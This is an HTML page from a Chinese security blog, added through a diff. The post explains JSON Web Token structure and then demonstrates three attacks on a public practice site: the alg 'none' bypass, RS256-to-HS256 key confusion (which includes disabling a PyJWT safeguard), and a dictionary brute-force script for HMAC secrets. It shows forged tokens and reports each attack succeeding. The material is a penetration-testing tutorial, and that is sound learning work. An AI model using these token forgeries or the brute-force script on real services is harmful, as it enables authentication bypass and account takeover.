@@ -1,0 +1,679 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="yhy的个人博客">
+  <meta name="author" content="yhy">
+  <meta name="keywords" content="">
+  
+  <title>初探JWT - yhy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>YHY</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="初探JWT">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      yhy
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-05 10:42" pubdate>
+        2021年3月5日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      29
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">初探JWT</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月6日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>  当你迷茫时，就去学习新东西</p>
+</blockquote>
+<h1 id="初探JWT"><a href="#初探JWT" class="headerlink" title="初探JWT"></a>初探JWT</h1><h2 id="0x01-什么是JWT"><a href="#0x01-什么是JWT" class="headerlink" title="0x01 什么是JWT"></a>0x01 什么是JWT</h2><p><strong>JWT</strong> 全称为 <strong>JSON Web Tokens</strong> ，是为了在网络应用环境间传递声明而执行的一种基于JSON 的开放标准 (RFC 7519)，该 token 被设计为紧凑且安全的，它的两大使用场景是：认证和数据交换，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
+<h2 id="0x02-JWT组成"><a href="#0x02-JWT组成" class="headerlink" title="0x02 JWT组成"></a>0x02 JWT组成</h2><p>一个JWT实际上就是一个字符串，它由三部分组成，<strong>头部</strong>、<strong>载荷</strong>与<strong>签名</strong>，中间用 <code>.</code> 分隔，例如：<code>xxxxx.yyyyy.zzzzz</code></p>
+<h4 id="2-1-头部-header"><a href="#2-1-头部-header" class="headerlink" title="2.1 头部(header)"></a>2.1 头部(header)</h4><p>头部通常由两部分组成：令牌的类型（即 JWT）和正在使用的签名算法（如 HMAC SHA256 或 RSA.）。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后用 <code>Base64url</code> 编码得到头部，即 <code>xxxxx</code>。</p>
+<blockquote>
+<p>  <strong>Base64URL算法</strong></p>
+<p>  该算法和常见Base64算法类似，稍有差别。Base64中用的三个字符是”+”，”/“和”=”，由于在URL中有特殊含义，因此Base64URL中对他们做了替换：”=”去掉，”+”用”-“替换，”/“用”_”替换，这就是Base64URL算法。</p>
+</blockquote>
+<h4 id="2-2-载荷-Payload"><a href="#2-2-载荷-Payload" class="headerlink" title="2.2 载荷(Payload)"></a>2.2 载荷(Payload)</h4><p>载荷中放置了 <code>token</code> 的一些基本信息，以帮助接收它的服务器来理解这个 <code>token</code>。同时还可以包含一些自定义的信息。</p>
+<p>JWT 官方规定了7个，也就是预定义（Registered claims）的载荷，供选用。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>  <span class="hljs-attr">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://localhost:8000/auth/login&quot;</span>,<br>  <span class="hljs-attr">&quot;iat&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;exp&quot;</span>: <span class="hljs-number">1454516119</span>,<br>  <span class="hljs-attr">&quot;nbf&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;jti&quot;</span>: <span class="hljs-string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span>, <br>  <span class="hljs-attr">&quot;aud&quot;</span>: <span class="hljs-string">&quot;dev&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  sub (subject)：主题</p>
+<p>  iss (issuer)：签发人</p>
+<p>  iat (Issued At)：签发时间</p>
+<p>  exp (expiration time)：过期时间</p>
+<p>  nbf (Not Before)：生效时间</p>
+<p>  jti (JWT ID)：编号</p>
+<p>  aud (audience)：受众</p>
+</blockquote>
+<p>除了以上字段之外，你完全可以添加自己想要的任何字段，这里还是提醒一下，由于JWT的标准，信息是不加密的，所以一些敏感信息最好不要添加到json里面</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;Name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-attr">&quot;Age&quot;</span>:<span class="hljs-number">18</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>将上面的 <code>json</code> 进行 <code>Base64url</code> 编码得到载荷，即 <code>yyyyy</code>。</p>
+<h4 id="2-3-签名-Signature"><a href="#2-3-签名-Signature" class="headerlink" title="2.3 签名(Signature)"></a>2.3 签名(Signature)</h4><p>签名时需要用到编码过的header、编码过的payload、一个秘钥（这个秘钥只有服务端知道），签名算法是header中指定的那个，如果以 <code>HMACSHA256</code> 加密，就如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure>
+
+<p>加密后再进行 <code>Base64url</code> 编码最后得到的字符串就是 <code>token</code> 的第三部分 <code>zzzzz</code>。</p>
+<p>组合便可以得到 <code>token：xxxxx.yyyyy.zzzzz</code>。</p>
+<p>签名的作用：保证 JWT 没有被篡改过，原理如下：</p>
+<blockquote>
+<p>  HMAC 算法是不可逆算法，类似 MD5 和 hash ，但多一个密钥，密钥（即上面的 secret）由服务端持有，客户端把 token 发给服务端后，服务端可以把其中的头部和载荷再加上事先的 secret 再进行一次 HMAC 加密，得到的结果和 token 的第三段进行对比，如果一样则表明数据没有被篡改。</p>
+<p>  注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p>
+</blockquote>
+<p>看一张图就明白了：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305142735.png" srcset="/img/loading.gif" lazyload alt="image-20210305142629387"></p>
+<h2 id="0x03-渗透测试中的JWT"><a href="#0x03-渗透测试中的JWT" class="headerlink" title="0x03 渗透测试中的JWT"></a>0x03 渗透测试中的JWT</h2><h4 id="3-1-敏感信息泄露"><a href="#3-1-敏感信息泄露" class="headerlink" title="3.1 敏感信息泄露"></a>3.1 敏感信息泄露</h4><p>显然，由于有效载荷是以明文(<code>Base64url</code>只是一种编码方式)形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。</p>
+<h4 id="3-2-将签名算法改为none"><a href="#3-2-将签名算法改为none" class="headerlink" title="3.2 将签名算法改为none"></a>3.2 将签名算法改为none</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改，但头部中的<code>alg</code>字段却可以改为<code>none</code>。</p>
+<p>另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。</p>
+<p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
+<p>靶场：<a target="_blank" rel="noopener" href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p>
+<p>以 <a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a> 靶场作为实验</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170239.png" srcset="/img/loading.gif" lazyload alt="image-20210305164337558"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.leCmAQCAuPZiAnnZLj6yUvL2WJ2R9oXZAgvtg04cRC8<br></code></pre></td></tr></table></figure>
+
+<p>如图，当前 jwt 指定的 alg 为 HS256 算法</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170247.png" srcset="/img/loading.gif" lazyload alt="image-20210305164732797"></p>
+<p>取出JWT中的头部<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code>解码后，将算法<code>HS256</code>改为<code>none</code>,再使用<code>Base64url</code>编码，结果为 <code>ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0</code> ，将结果替换原始的header，再加上自己修改好的载荷(payload)，然后删除签名，但<strong>保留最后一个点</strong>，将其发送到演示页面，看 server 端是否接受 none 算法，从而绕过了算法签名。</p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT, 可以自己用<code>Base64url</code>编码后组合，也可以使用下面代码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apl">#!&#x2F;usr&#x2F;bin&#x2F;python3<br># -*- coding:utf-8 -*-<br># @Author : yhy<br>import jwt<br><br>print(jwt.encode(&#123;<br>&quot;iss&quot;: &quot;http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;&quot;,<br>&quot;iat&quot;: 1614933803,<br>&quot;exp&quot;: 1614935003,<br>&quot;data&quot;: &#123;<br>&quot;hello&quot;: &quot;world&quot;<br>&#125;<br>&#125;, key&#x3D;&#39;&#39;, algorithm&#x3D;&#39;none&#39;))<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>另外，某些 JWT 实现对大小写敏感，所以，当none不通过时，可以继续尝试 None、nOne、NONE等等。上述代码只支持none，其它的请自行使用<code>Base64url</code>编码。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.<br></code></pre></td></tr></table></figure>
+
+<p>攻击成功</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170252.png" srcset="/img/loading.gif" lazyload alt="image-20210305170222663"></p>
+<h4 id="3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）"><a href="#3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）" class="headerlink" title="3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）"></a>3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p>
+<p>如果后端的验证是根据header的alg选择算法，并且支持 HS256 对称加密算法， 碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密（ps：在靶场中我们是直接获取，在实战中，如果是对客户进行服务的话，我们可以让客户提供公钥，毕竟只是一个公钥，为了详细测出系统漏洞，这应该是被允许的，另一个可能的来源是服务器的TLS证书，从证书中导出公钥），这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法，此时即不存在公钥私钥问题，因为对称密码算法只有一个key，所以肯定可以正常解密解析，从而绕过了算法限制。</p>
+<p>当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。</p>
+<p>使用靶场进行此次攻击 <a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a> 这是<code>RS256</code>加密</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151931.png" srcset="/img/loading.gif" lazyload alt="image-20210306151929356"></p>
+<p>从源码中，我们也可以看到它需要一个RS256签名，但也接受一个HS256签名。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151650.png" srcset="/img/loading.gif" lazyload alt="image-20210306151610286"></p>
+<p>靶场的公钥获取：<a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a> </p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305172816.png" srcset="/img/loading.gif" lazyload alt="image-20210305172812817"></p>
+<p>将公钥保存为<code>public.pem</code>，<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>，重要的事情说三遍</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152239.png" srcset="/img/loading.gif" lazyload alt="image-20210306151222844"></p>
+<p>运行脚本（打靶场时请将{…}中的值修改，如果您现在提交，它将失败，因为它已经过期）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 非对称加密，改为对称加密 ，需要公钥</span><br><span class="hljs-keyword">import</span> jwt<br><br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() <span class="hljs-comment"># 公钥</span><br>print(jwt.encode(&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://demo.sjoerdlangkemper.nl/&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1615015143</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1615016343</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;JWT&quot;</span>: <span class="hljs-string">&quot;RS256 -&gt; HS256 test &quot;</span><br>  &#125;<br>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip install PyJWT<br>python3 jwt_test.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152213.png" srcset="/img/loading.gif" lazyload alt="image-20210305211926691"></p>
+<p>如果出现以上错误，请执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip uninstall jwt<br>python3 -m pip uninstall PyJWT<br>python3 -m pip install PyJWT<br></code></pre></td></tr></table></figure>
+
+<p>运行</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152614.png" srcset="/img/loading.gif" lazyload alt="image-20210305213239054"></p>
+<p>查资料说是因为jwt模块更新后，为了防止滥用，加入了强校验，如果指定算法为 HS256 而提供 RSA 的公钥作为 key 时会报错，无法往下执行，需要注释掉 <strong>site-packages/jwt/algorithms.py</strong> 中的如下五行：</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152610.png" srcset="/img/loading.gif" lazyload alt="image-20210305213418057"></p>
+<p>成功运行</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152104.png" srcset="/img/loading.gif" lazyload alt="image-20210306152103157"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYxNTAxNTE0MywiZXhwIjoxNjE1MDE2MzQzLCJkYXRhIjp7IkpXVCI6IlJTMjU2IC0-IEhTMjU2IHRlc3QgIn19.HWN7y4FVaRZMNHiCWwcGuEOruLpPYKw_UOtNj4iXbC8<br></code></pre></td></tr></table></figure>
+
+<p>提交JWT，攻击成功</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152109.png" srcset="/img/loading.gif" lazyload alt="image-20210306152039256"></p>
+<h4 id="3-4-暴力破解密钥"><a href="#3-4-暴力破解密钥" class="headerlink" title="3.4 暴力破解密钥"></a>3.4 暴力破解密钥</h4><p>当 alg 指定 HMAC 类对称加密算法时，可以进行针对 key 的暴力破解，比如当算法为HS256，HS256算法使用密钥对消息进行签名和验证，如果知道密钥，则可以创建自己的签名消息。所有当密钥不够牢固时，则可以使用蛮力或<a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets">字典</a>攻击将其破解。</p>
+<p>靶场：<a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p>
+<p>使用python脚本进行字典破解，将下方的 jwt_json 换成自己的值，字典可以从 <a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a> 获取 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 暴力破解脚本</span><br><br><span class="hljs-keyword">import</span> jwt<br><br>jwt_json=<span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNTAyMTAzNiwiZXhwIjoxNjE1MDIyMjM2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.x_ENVoZZRSDnjUqKHOAOYvTDrAtzfLw-_i02Qqry7so&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;jwt.secrets.list&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        key = line.strip()<br>        <span class="hljs-keyword">try</span>:<br>            jwt.decode(jwt_json, verify=<span class="hljs-literal">True</span>, key=key, algorithms=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.InvalidSignatureError):<br>            print(<span class="hljs-string">&#x27;verify key! --&gt;&#x27;</span> + key)<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;key not found!&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>运行</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170654.png" srcset="/img/loading.gif" lazyload alt="image-20210306165921066"></p>
+<p>爆破出密钥为：<code>secret</code>，借助 <a target="_blank" rel="noopener" href="https://jwt.io/#debugger">https://jwt.io/#debugger</a>  即可进行消息的恶意伪造，篡改，</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170702.png" srcset="/img/loading.gif" lazyload alt="image-20210306165956842"></p>
+<p>将左侧 jwt 复制发送，攻击成功</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170715.png" srcset="/img/loading.gif" lazyload alt="image-20210306170013690"></p>
+<p>字典跑不出时，还可以使用 <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  工具进行暴力破解</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web%E6%B8%97%E9%80%8F/">Web渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
